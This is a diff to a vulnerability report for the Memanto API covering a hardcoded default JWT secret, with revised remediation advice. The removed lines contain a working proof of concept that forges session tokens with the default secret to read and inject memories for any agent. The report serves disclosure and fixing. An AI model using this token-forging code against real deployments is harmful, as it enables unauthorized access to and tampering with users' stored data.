@@ -54,47 +54,15 @@ The server will accept the forged token as valid, granting the attacker full acc
 
 ## Proof of Concept
 
-Run the following against any Memanto instance that uses the default secret:
+A standalone PoC script is provided at **`docs/bounty_reports/poc_forge_jwt.py`**.
 
-```python
-import jwt, requests
+Run it from the repo root:
 
-DEFAULT_SECRET = "memanto-default-secret-change-in-production"
-TARGET_API = "http://localhost:8000"  # change to target
-
-# Step 1: Forge a session token for any agent
-payload = {
-    "agent_id": "arbitrary-victim",
-    "namespace": "memanto_agent_arbitrary-victim",
-    "session_id": "sess_forged_001",
-    "started_at": "2026-06-30T00:00:00",
-    "expires_at": "2027-06-30T00:00:00",
-}
-forged_token = jwt.encode(payload, DEFAULT_SECRET, algorithm="HS256")
-
-# Step 2: Use the forged token to access the API
-headers = {"X-Session-Token": forged_token}
-
-# Read memories of the victim agent
-resp = requests.post(
-    f"{TARGET_API}/api/v2/agents/arbitrary-victim/recall",
-    headers=headers,
-    json={"query": "test", "limit": 10}
-)
-
-# Write fake memories to the victim agent
-resp = requests.post(
-    f"{TARGET_API}/api/v2/agents/arbitrary-victim/remember",
-    headers=headers,
-    json={
-        "type": "fact",
-        "content": "This was injected by an attacker",
-        "source": "user"
-    }
-)
-
-print("Attacker has full read/write access to victim's memories")
+```bash
+python docs/bounty_reports/poc_forge_jwt.py
 ```
+
+This script is NOT part of the automated test suite — it will naturally stop working once the fix is applied (which is the goal).
 
 ---
 
@@ -110,28 +78,36 @@ print("Attacker has full read/write access to victim's memories")
 
 ## Remediation
 
-### Option A (Recommended): Reject Default in Production
+### Option A (Recommended): Validate on Startup
 
-Modify `config.py` to **refuse to start** when the secret is still the default:
+Modify the `Settings` class in `config.py` to validate the secret at startup and raise a clear error when it's still the default:
 
 ```python
-@property
-def jwt_secret(self) -> str:
-    key = os.getenv("MEMANTO_SECRET_KEY")
-    if not key or key == "memanto-default-secret-change-in-production":
-        raise RuntimeError(
-            "MEMANTO_SECRET_KEY must be set to a unique, strong value "
-            "in production. Generate one with: python3 -c \"import secrets; print(secrets.token_urlsafe(32))\""
+# In memanto/app/config.py
+@pydantic.field_validator("MEMANTO_SECRET_KEY", mode="after")
+@classmethod
+def reject_default_secret(cls, v: str) -> str:
+    if v == "memanto-default-secret-change-in-production":
+        raise ValueError(
+            "MEMANTO_SECRET_KEY is still set to the insecure default. "
+            "Generate a unique key with: python3 -c \"import secrets; print(secrets.token_urlsafe(32))\" "
+            "and set it in your environment or .env file."
         )
-    return key
+    return v
 ```
 
-### Option B: Auto-generate on First Run
+Pydantic's `field_validator` runs on every `Settings()` instantiation, covering all environments (dev/test/prod) with a single, consistent check. Environment-specific gating is not needed because running with the default key is never correct — even in development, doing so normalises an insecure practice that can accidentally leak to production.
 
-```python
-import secrets
-MEMANTO_SECRET_KEY: str = secrets.token_urlsafe(32)
+### Option B: Generate Once, Persist in Config
+
+If auto-generation is preferred for local development, generate the secret **once** and persist it so it survives restarts:
+
+```bash
+# One-time setup
+python3 -c "import secrets; print(f'MEMANTO_SECRET_KEY={secrets.token_urlsafe(32)}')" >> .env
 ```
+
+Do **not** generate the key at import time (`secrets.token_urlsafe(32)` as a module-level default) — that creates a new signing key on every process start, invalidating all existing sessions and breaking multi-worker deployments where different workers end up with different keys.
 
 ---
 
